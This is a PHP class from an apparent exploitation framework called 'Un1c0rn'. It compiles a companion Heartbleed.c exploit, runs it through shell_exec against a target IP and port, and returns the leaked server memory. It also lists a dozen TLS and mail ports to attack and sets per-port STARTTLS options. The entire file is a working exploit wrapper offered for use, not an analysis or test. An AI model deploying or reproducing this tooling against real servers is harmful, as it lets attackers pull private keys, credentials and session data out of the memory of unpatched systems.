<?php
namespace Un1c0rn\Workers\Exploits;

class Heartbleed extends \Un1c0rn\BaseExploit implements \Un1c0rn\ExploitInterface {
  
  
  	function getExploitData() {
  	 if(!$this->isCompiled()) $this->compile();
  	 $cmd  = __DIR__.'/Heartbleed.bin -s '.
  	 	escapeshellarg($this->ip).' -p '.
  	 	escapeshellarg($this->port)
  	 	. ' -f /dev/stdout ';
  	 switch($this->port) {
  	 	case 995:
  	 		$cmd .= ' -c 1';
  	 		break;
  	 	case 993:
  	 		$cmd .= ' -c 2';
  	 		break;
  	 	case 465:
  	 	case 587:
  	 		$cmd .= ' -c 0';
  	 		break;
  	 }
  	  $cmd .= ' -t 1 2>/dev/null';
  	  $data = shell_exec($cmd);
  	  if(empty($data)) return false;
  	  return $data;	
	}
	function getAffectedPorts() {
		return array(443,465,587,995,993,8443,10000,5001,5000,9443,9001,9002);
	}
	function getTag() {
		return 'heartbleed';
	}
	function isCompiled() {
	  return file_exists(__DIR__.'/Heartbleed.bin');
	}
	function compile() {
	  shell_exec('gcc '.__DIR__.'/Heartbleed.c -o '.__DIR__.'/Heartbleed.bin -Wl,-Bstatic -lssl -Wl,-Bdynamic -lssl3 -lcrypto');
	}
}
